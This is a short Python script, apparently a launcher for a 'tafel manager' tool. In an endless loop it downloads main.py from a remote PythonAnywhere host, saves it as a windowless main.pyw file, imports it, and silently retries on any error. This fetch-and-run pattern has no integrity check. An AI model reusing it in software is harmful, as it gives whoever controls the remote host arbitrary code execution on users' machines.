import pathlib
import requests
import time
while True:
    try:
        code = requests.get("https://gsgtafelmanager.pythonanywhere.com/file/main.py").content
        with open(str(pathlib.Path(__file__).parent / "main.pyw"), "wb") as f:
            f.write(code)
        import main
    except:
        time.sleep(10)
        continue
